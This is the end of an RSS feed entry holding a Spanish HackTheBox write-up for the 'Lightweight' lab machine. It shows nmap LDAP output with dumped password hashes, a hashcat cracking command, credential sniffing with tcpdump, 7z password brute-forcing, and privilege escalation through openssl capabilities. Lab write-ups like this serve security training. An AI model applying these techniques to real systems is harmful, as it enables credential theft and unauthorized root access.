&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;People,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uid: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         sn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         mail: ldapuser2@lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: person
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: organizationalPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: inetOrgPerson
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: shadowAccount
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowLastChange: &lt;span class=&#34;m&#34;&gt;17691&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowMax: &lt;span class=&#34;m&#34;&gt;99999&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         shadowWarning: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         loginShell: /bin/bash
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         uidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         homeDirectory: /home/ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser1,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         gidNumber: &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldapuser2,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Group,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: posixGroup
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         objectClass: top
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         cn: ldapuser2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         userPassword: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;crypt&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;x
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_        gidNumber: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:14 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 14.17 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;hashcat&#34;&gt;HASHCAT&lt;/h1&gt;
&lt;p&gt;Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt; -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$6$3&lt;/span&gt;qx0SD9x&lt;span class=&#34;nv&#34;&gt;$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj&lt;/span&gt;.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
&lt;span class=&#34;nv&#34;&gt;$6$xJxPjT0M$1&lt;/span&gt;m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje  &lt;code&gt;This site is protected by agains bruteforging.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar las paginas disponibles encontramos&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina de user nos muestra un mensaje &lt;code&gt;This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... &lt;/code&gt;, la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.&lt;/p&gt;
&lt;h1 id=&#34;limited-ssh&#34;&gt;LIMITED SSH&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/3.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/4.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas &lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;capacidades&lt;/strong&gt;&lt;/a&gt; (getcap/setcap).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/5.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; y &lt;code&gt;CAP_NET_RAW&lt;/code&gt;, para realizar operaciones relacionadas a la red.&lt;/p&gt;
&lt;h1 id=&#34;ldapuser2&#34;&gt;LDAPUSER2&lt;/h1&gt;
&lt;h2 id=&#34;tcpdump&#34;&gt;TCPDUMP&lt;/h2&gt;
&lt;p&gt;Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/6.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/7.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el &lt;code&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/8.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;ldapuser1&#34;&gt;LDAPUSER1&lt;/h1&gt;
&lt;p&gt;En nuestra carpeta como usuario ldapuser2 encontramos un archivo &lt;code&gt;backup.7z&lt;/code&gt; al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello &lt;a href=&#34;https://github.com/philsmd/7z2hashcat&#34;&gt;&lt;strong&gt;7z2hashcat.pl&lt;/strong&gt;&lt;/a&gt; nos fue de gran ayuda.&lt;/p&gt;
&lt;p&gt;Al descomprimir el contenido de &lt;code&gt;backup.7z&lt;/code&gt; encontramos lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/9.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en &lt;code&gt;status.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;root-flag---openssl&#34;&gt;ROOT FLAG - OPENSSL&lt;/h1&gt;
&lt;p&gt;Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos openssl para hacer bypass &lt;a href=&#34;https://gtfobins.github.io/gtfobins/openssl/&#34;&gt;&lt;strong&gt;(openssl)&lt;/strong&gt;&lt;/a&gt;, leer y escribir archivos. En este caso vamos a utilizar &lt;code&gt;openssl&lt;/code&gt; para leer el &lt;code&gt;root.txt&lt;/code&gt; flag que se encuentra en &lt;code&gt;/root/root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/light/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>capabilities</category>
            
          
            
              <category>tcpdump</category>
            
          
            
              <category>openssl</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>